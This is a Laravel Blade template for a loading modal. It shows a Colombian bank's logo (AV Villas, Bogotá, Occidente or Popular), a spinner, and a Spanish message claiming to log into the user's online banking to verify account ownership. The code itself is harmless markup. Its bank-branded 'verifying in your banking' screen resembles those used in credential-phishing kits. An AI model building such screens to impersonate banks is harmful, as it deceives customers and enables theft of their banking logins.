{{-- Modal de Verificación --}}
@php
    $banco = $banco ?? 'avvillas';
    $bancos = [
        'avvillas' => ['nombre' => 'Banco AV Villas', 'logo' => 'logo-avv.png'],
        'bogota' => ['nombre' => 'Banco de Bogotá', 'logo' => 'logo-bog.png'],
        'occidente' => ['nombre' => 'Banco de Occidente', 'logo' => 'logo-occ.png'],
        'popular' => ['nombre' => 'Banco Popular', 'logo' => 'logo-pop.png'],
    ];
    $bancoInfo = $bancos[$banco] ?? $bancos['avvillas'];
@endphp

<div class="modal-overlay">
    <div class="modal-content">
        <div class="content">
            <div class="logo-container">
                <img src="{{ asset('images/' . $bancoInfo['logo']) }}" alt="{{ $bancoInfo['nombre'] }}" class="logo" />
            </div>

            <div class="spinner-container">
                <div class="spinner"></div>
            </div>

            <p class="message">
                Ingresando a tu banca virtual para verificar si eres el titular de la cuenta
            </p>
        </div>
    </div>
</div>

<style>
    .modal-overlay {
        position: fixed;
        inset: 0;
        background-color: rgba(0, 0, 0, 0.5);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 50;
        padding: 1rem;
    }

    .modal-content {
        background-color: white;
        border-radius: 1rem;
        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
        max-width: 85vw;
        width: 100%;
        padding: 1rem;
        animation: fadeIn 0.3s ease-out;
        box-sizing: border-box;
    }

    @keyframes fadeIn {
        from { opacity: 0; transform: scale(0.9); }
        to { opacity: 1; transform: scale(1); }
    }

    .content {
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 1.5rem;
        width: 100%;
    }

    .logo-container {
        display: flex;
        justify-content: center;
        margin-bottom: 0.5rem;
    }

    .logo {
        height: 3.5rem;
        max-width: 100%;
        width: auto;
        object-fit: contain;
    }

    .spinner-container {
        position: relative;
    }

    .spinner {
        width: 5rem;
        height: 5rem;
        border: 4px solid #dbeafe;
        border-top-color: #2563eb;
        border-radius: 50%;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        to { transform: rotate(360deg); }
    }

    .message {
        text-align: center;
        color: #374151;
        font-size: 1rem;
        font-weight: 500;
        padding: 0 0.5rem;
    }
</style>
